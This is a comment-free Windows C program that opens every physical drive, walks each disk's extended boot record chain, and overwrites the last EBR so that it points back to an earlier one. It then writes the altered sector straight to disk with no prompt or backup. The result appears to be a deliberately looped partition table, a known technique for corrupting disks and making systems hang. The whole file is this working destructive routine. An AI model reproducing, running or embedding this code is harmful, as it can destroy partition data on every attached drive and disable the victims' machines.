#include <stdio.h>
#include <Windows.h>
#include <string.h>

#define PAR_1 0x01BE
#define PAR_2 0x01CE
#define PAR_3 0x01DE
#define PAR_4 0x01EE

typedef struct _EBR
{
	char ebr_data[16];
	unsigned int next_sector_relative;
} EBR;

HANDLE Open(char *dev_file)
{
	HANDLE hdev = CreateFileA(dev_file, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	return hdev;
}

int Pos(HANDLE hdev, long long off)
{
	LARGE_INTEGER offset;
	offset.QuadPart = off * 512;
	LARGE_INTEGER out_offset;
	return SetFilePointerEx(hdev, offset, &out_offset, FILE_BEGIN);
}

int Read(HANDLE hdev, char *buff, DWORD byte_in)
{
	DWORD byte_out = 0;
	return ReadFile(hdev, buff, byte_in, &byte_out, NULL);
}

int Write(HANDLE hdev, char *buff, DWORD byte_in)
{
	DWORD byte_out = 0;
	return WriteFile(hdev, buff, byte_in, &byte_out, NULL);
}

int Has_EBR(char *sector)
{
	int offset = PAR_1;
	while (1)
	{
		int sys_id = sector[offset + 4];
		if (sys_id == 0x05 || sys_id == 0x0F)
		{
			return offset;
		}
		offset += 16;
		if (offset > PAR_4)
		{
			return 0;
		}
	}
}

char *get_sector(HANDLE hdev)
{
	static char sector[512];
	int r = Read(hdev, sector, 512);
	return r ? sector : NULL;
}

int List_EBR(HANDLE hdev, EBR *list)
{
	int ebr_index = 0;
	long long ebr_first_sector = 0;
	long long current_sector = 0;
	char *sector;
	int offset = 0;
	while (1)
	{
		Pos(hdev, current_sector);
		sector = get_sector(hdev);
		offset = Has_EBR(sector);
		if (offset)
		{
			memcpy(list[ebr_index].ebr_data, &sector[offset], 16);
			list[ebr_index].next_sector_relative = *((unsigned int*)(&list[ebr_index].ebr_data[8]));
			current_sector = ebr_first_sector + list[ebr_index].next_sector_relative;
			if (ebr_first_sector == 0)
			{
				ebr_first_sector = current_sector;
			}
			ebr_index += 1;
		}
		else
		{
			break;
		}
	}
	return ebr_index;
}

int main(int argc, char **argv)
{
	char dev_name[512];
	int d = 0;
	while (1)
	{
		sprintf(dev_name, "\\\\.\\PhysicalDrive%d", d);
		HANDLE hdev = Open(dev_name);
		if (hdev != INVALID_HANDLE_VALUE)
		{
			EBR list[1024];
			int total_ebr = List_EBR(hdev, list);
			printf("Total EBR : %d \n", total_ebr);
			if (total_ebr >= 2)
			{
				long long last_ebr_pos = list[0].next_sector_relative + list[total_ebr - 1].next_sector_relative;
				Pos(hdev, last_ebr_pos);
				char *sector = get_sector(hdev);
				memcpy(&sector[PAR_2], list[1].ebr_data, 16);
				int i;
				for (i = 0; i < 512; i++)
				{
					if ((i % 16) == 0) printf("\n");
					printf("%02X ", *((unsigned char*)(&sector[i])));
				}
				printf("\n");
				Pos(hdev, last_ebr_pos);
				if (Write(hdev, sector, 512))
                {
                    printf("overwrite sector %lld => OK \n", last_ebr_pos);
                }
			}
			CloseHandle(hdev);
			d += 1;
		}
		else
        {
            break;
        }
	}
	return 0;
}
